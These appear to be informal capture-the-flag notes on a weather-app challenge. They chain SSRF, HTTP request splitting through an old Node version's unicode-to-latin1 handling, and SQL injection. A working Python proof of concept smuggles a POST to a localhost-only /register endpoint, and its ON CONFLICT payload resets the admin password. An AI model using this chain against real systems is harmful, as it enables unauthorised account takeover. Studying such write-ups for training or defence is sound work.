Undoable haha.... (insanely precise code needed)

Basically,

1. SSRF possible in /api/weather  
2. SQL injection available in /register but only accept request from 127.0.0.1
3. Vulnerable version of node used allows sending two http requests in a single req
	- SSRF response splitting through /api/weather
	- allows sending of 
1. Create a post request to /api/weather that hides a post req to /register that hides a SQLi
2. .... Ridiculous .....


POC for changing password of admin to admin
```python
import requests

  
  
url = "http://144.126.206.60:32174"

username="admin"
password="123') ON CONFLICT(username) DO UPDATE SET password = 'admin';--"

parsedUsername = username.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")
parsedPassword = password.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")
contentLength = len(parsedUsername) + len(parsedPassword) + 19


endpoint = '127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120' + str (contentLength) + '\u010D\u010A\u010D\u010Ausername='+parsedUsername + '&password='+ parsedPassword + '\u010D\u010A\u010D\u010AGET\u0120/?lol='

  

city='test'
country='test'

res=requests.post(url=url+'/api/weather',json='endpoint':endpoint,'city':city,'country':country)

```


Things to note:
- url had to be http://144.126.206.60:32174 not http://144.126.206.60:32174/ the backslash gives error

- payload sent is meant to be ĠDOĠ etc not the escaped versions 
	- ie use \\u0120 not \\\\u0120


exploit info:
HTTP libs usually escape special chars but this ver of node cant detect unicode being used 
unicode --> Node --> encoded as latin1 --> server

\\u010A --> (allows) --> \\n                  --> server renders it as next line char
\u0120   --> (allows) --> "space char" --> server renders it as a space
%22      --> (allows) --> "                    --> server renders it as "




